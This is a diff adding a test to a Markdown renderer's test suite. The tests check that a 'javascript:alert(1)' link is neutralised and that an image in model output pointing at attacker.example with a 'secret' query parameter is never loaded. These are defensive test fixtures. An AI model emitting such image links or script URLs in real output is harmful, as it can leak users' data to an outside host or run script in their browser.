@@ -68,4 +68,13 @@ describe('Markdown', () => {
     const { container } = render(<Markdown>{'[click](javascript:alert(1))'}</Markdown>);
     expect(container.querySelector('a[href^="javascript:"]')).toBeNull();
   });
+
+  it('never loads images from model output (shows alt text only)', () => {
+    const { container } = render(
+      <Markdown>{'See ![invoice chart](https://attacker.example/x.png?d=secret)'}</Markdown>,
+    );
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.innerHTML).not.toContain('attacker.example');
+    expect(container.textContent).toContain('invoice chart');
+  });
 });
